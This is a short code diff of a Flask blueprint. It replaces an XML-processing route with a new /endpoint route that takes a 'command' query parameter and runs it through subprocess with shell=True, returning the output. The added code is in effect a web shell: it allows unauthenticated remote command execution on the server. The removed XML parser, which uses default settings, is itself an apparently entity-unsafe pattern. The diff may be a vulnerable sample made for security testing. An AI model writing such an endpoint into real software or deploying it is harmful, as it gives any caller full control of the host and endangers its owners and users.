@@ -1,23 +1,20 @@
-from flask import Blueprint, request
-from lxml import etree
+from flask import Blueprint, request, jsonify
+import subprocess
 
 endpoint_bp = Blueprint("endpoint", __name__)
-@endpoint_bp.route("/process_xml", methods=['POST'])
-def process_xml():
-    xml_data = request.form.get('xml_data')
 
-    if xml_data:
-        try:
-            parser = etree.XMLParser()
-            root = etree.fromstring(xml_data, parser=parser)
+@endpoint_bp.route("/endpoint")
+def endpoint():
+    try:
+        req = request.args.get('command', '')
 
-            # Extract data from XML
-            title = root.find('title').text
-            description = root.find('description').text
-
-            return f"Title: {title}, Description: {description}"
-        except Exception as e:
-            return f"Error processing XML: {str(e)}"
+        if not req:
+            return jsonify({'error': 'No command provided'}), 400
         
-    return "No XML data provided"
+        result = subprocess.run(req, shell=True, capture_output=True, text=True)
 
+        return jsonify({'status': result.stdout.splitlines()}), 200
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+   
